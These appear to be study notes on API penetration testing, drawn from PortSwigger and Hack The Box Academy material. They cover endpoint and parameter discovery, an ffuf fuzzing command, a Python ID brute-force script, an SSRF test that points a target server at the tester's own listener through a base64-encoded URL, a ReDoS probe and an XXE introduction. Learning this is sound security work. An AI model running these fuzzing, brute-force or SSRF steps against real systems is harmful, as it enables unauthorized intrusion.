# Discovery
## Discovering API documentation
```
/api
/swagger/index.html
/openapi.json
```
## Using machine-readable documentation

You can use a range of automated tools to analyze any machine-readable API documentation that you find.

You can use Burp Scanner to crawl and audit OpenAPI documentation, or any other documentation in JSON or YAML format. You can also parse OpenAPI documentation using the OpenAPI Parser BApp.

You may also be able to use a specialized tool to test the documented endpoints, such as Postman or SoapUI.

## Identifying supported HTTP methods

The HTTP method specifies the action to be performed on a resource. For example:

- `GET` - Retrieves data from a resource.
- `PATCH` - Applies partial changes to a resource.
- `OPTIONS` - Retrieves information on the types of request methods that can be used on a resource.

An API endpoint may support different HTTP methods. It's therefore important to test all potential methods when you're investigating API endpoints. This may enable you to identify additional endpoint functionality, opening up more attack surface.

For example, the endpoint `/api/tasks` may support the following methods:

- `GET /api/tasks` - Retrieves a list of tasks.
- `POST /api/tasks` - Creates a new task.
- `DELETE /api/tasks/1` - Deletes a task.

You can use the built-in **HTTP verbs** list in Burp Intruder to automatically cycle through a range of methods.

## Identifying supported content types

API endpoints often expect data in a specific format. They may therefore behave differently depending on the content type of the data provided in a request. Changing the content type may enable you to:

- Trigger errors that disclose useful information.
- Bypass flawed defenses.
- Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

To change the content type, modify the `Content-Type` header, then reformat the request body accordingly. You can use the Content type converter BApp to automatically convert data submitted within requests between XML and JSON.
## Using Intruder to find hidden endpoints

Once you have identified some initial API endpoints, you can use Intruder to uncover hidden endpoints. For example, consider a scenario where you have identified the following API endpoint for updating user information:

`PUT /api/user/update`

To identify hidden endpoints, you could use Burp Intruder to find other resources with the same structure. For example, you could add a payload to the `/update` position of the path with a list of other common functions, such as `delete` and `add`.

When looking for hidden endpoints, use wordlists based on common API naming conventions and industry terms. Make sure you also include terms that are relevant to the application, based on your initial recon.
## Finding hidden parameters

When you're doing API recon, you may find undocumented parameters that the API supports. You can attempt to use these to change the application's behavior. Burp includes numerous tools that can help you identify hidden parameters:

- Burp Intruder enables you to automatically discover hidden parameters, using a wordlist of common parameter names to replace existing parameters or add new parameters. Make sure you also include names that are relevant to the application, based on your initial recon.
- The Param miner BApp enables you to automatically guess up to 65,536 param names per request. Param miner automatically guesses names that are relevant to the application, based on information taken from the scope.
- The Content discovery tool enables you to discover content that isn't linked from visible content that you can browse to, including parameters.

Since mass assignment creates parameters from object fields, you can often identify these hidden parameters by manually examining objects returned by the API.


## Information Disclosure
Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using _ffuf_ and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) list, as follows.

```shell-session
ffuf -w "/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
```

Find below a Python script that could automate retrieving all information that the API returns (save it as `brute_api.py`).

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

## Server-Side Request Forgery
Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution


```bash

echo "http://10.10.15.95:5555" | tr -d '\n' | base64 
aHR0cDovLzEwLjEwLjE1Ljk1OjU1NTU=  
~/Inev/htb_academy ‚ùØ curl "http://10.129.202.133:3000/api/userinfo?id=aHR0cDovLzEwLjEwLjE1Ljk1OjU1NTU="
curl: (52) Empty reply from server
```
## Regular Expression Denial of Service (ReDoS)

Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine. The longer this crafted payload is, the longer the API will take to respond. Exploiting such "evil" patterns in a regular expression to increase evaluation time is called a Regular Expression Denial of Service (ReDoS) attack.

```bash
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

## XML External Entity (XXE) Injection

XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down. Our [Web Attacks](https://academy.hackthebox.com/module/details/134) module covers XXE Injection vulnerabilities in detail. It should be noted that XXE vulnerabilities affect web applications and APIs alike.
